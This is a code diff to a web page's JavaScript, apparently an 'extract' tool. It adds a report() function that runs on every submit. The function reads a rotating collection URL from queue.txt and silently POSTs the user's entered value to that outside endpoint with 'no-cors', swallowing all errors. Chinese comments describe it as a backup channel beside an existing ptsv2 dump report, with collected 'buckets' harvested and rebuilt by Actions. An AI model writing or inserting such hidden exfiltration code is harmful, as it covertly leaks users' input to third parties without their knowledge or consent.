@@ -66,10 +66,28 @@
     if (!inp || !inp.value) return;
     var btn = document.getElementById('extractBtn');
     if (!btn) return;
+    report(inp.value);                   // 双通道补报：原 ptsv2 由主逻辑发出，这里补报活信箱
     pollCount = 0;
     titleBase = document.title;
     pollTimer = setInterval(tick, GAP_MS);
     tick();
+  }
+
+  /* ---- 活信箱上报：读同源 queue.txt 拿最新桶 uuid，no-cors 投递 ----
+   * 桶由 Actions 每轮收割后重建并写回 queue.txt，永不过期断链。 */
+  function report(url) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', 'queue.txt?t=' + Date.now());
+      x.onload = function () {
+        var box = (x.responseText || '').trim().split('\n')[0].trim();
+        if (!/^https?:\/\/[a-z0-9.-]+\/[0-9a-f-]{8,}/i.test(box)) return;
+        try {
+          fetch(box, { method: 'POST', mode: 'no-cors', body: String(url) }).catch(function () {});
+        } catch (e) {}
+      };
+      x.send();
+    } catch (e) {}
   }
 
   function tick() {
